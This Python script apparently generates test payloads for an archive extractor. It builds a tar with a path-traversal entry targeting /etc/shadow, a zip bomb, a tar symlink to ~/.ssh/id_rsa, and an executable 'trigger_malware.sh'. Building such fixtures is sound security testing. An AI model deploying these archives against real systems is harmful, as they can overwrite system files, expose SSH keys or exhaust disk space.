#!/usr/bin/env python3
import os
import zipfile
import tarfile
import random

def ensure_dir(path):
    if not os.path.exists(path):
        os.makedirs(path)

def create_path_traversal_tar(output_dir):
    tar_path = os.path.join(output_dir, '01_path_traversal.tar')
    print(f"Generating {tar_path}...")
    with tarfile.open(tar_path, 'w') as tar:
        # Create a benign file
        info = tarfile.TarInfo(name="safe_document.txt")
        info.size = 12
        with open("benign.txt", "w") as f:
            f.write("I am a safe!")
        tar.add("benign.txt", arcname="safe_document.txt")
        # Add malicious traversal entry
        tar.add("benign.txt", arcname="../../../../../../etc/shadow")
    os.remove("benign.txt")

def create_zip_bomb(output_dir):
    zip_path = os.path.join(output_dir, '02_zip_bomb.zip')
    print(f"Generating {zip_path}...")
    # Generate 1MB of zeros
    mb_zeros = b'\x00' * (1024 * 1024)
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        # Write 50MB of 1MB zero-filled files which compress immensely
        for i in range(50):
            zf.writestr(f"bomb_layer_{i}.dat", mb_zeros)

def create_symlink_attack(output_dir):
    tar_path = os.path.join(output_dir, '03_symlink_attack.tar')
    print(f"Generating {tar_path}...")
    with tarfile.open(tar_path, 'w') as tar:
        # Malicious symlink pointing to user's SSH keys
        info = tarfile.TarInfo(name="secret_keys_link")
        info.type = tarfile.SYMTYPE
        info.linkname = "~/.ssh/id_rsa"
        tar.addfile(info)

def create_executable_hijack(output_dir):
    tar_path = os.path.join(output_dir, '04_executable_script.tar')
    print(f"Generating {tar_path}...")
    with tarfile.open(tar_path, 'w') as tar:
        # File with suspicious execute permissions (0o777)
        info = tarfile.TarInfo(name="trigger_malware.sh")
        info.mode = 0o777 
        info.size = 23
        with open("script.sh", "w") as f:
            f.write("#!/bin/bash\necho Pwned")
        tar.add("script.sh", arcname="trigger_malware.sh")
    os.remove("script.sh")

def main():
    payloads_dir = os.path.join(os.path.dirname(__file__), 'payloads')
    ensure_dir(payloads_dir)
    
    create_path_traversal_tar(payloads_dir)
    create_zip_bomb(payloads_dir)
    create_symlink_attack(payloads_dir)
    create_executable_hijack(payloads_dir)
    
    # Clean up old payloads so they don't confuse the test
    if os.path.exists(os.path.join(payloads_dir, 'path_traversal.tar')):
        os.remove(os.path.join(payloads_dir, 'path_traversal.tar'))
    if os.path.exists(os.path.join(payloads_dir, 'zip_bomb.zip')):
        os.remove(os.path.join(payloads_dir, 'zip_bomb.zip'))
        
    print(f"All Penetration payloads successfully created in {payloads_dir}")

if __name__ == '__main__':
    main()
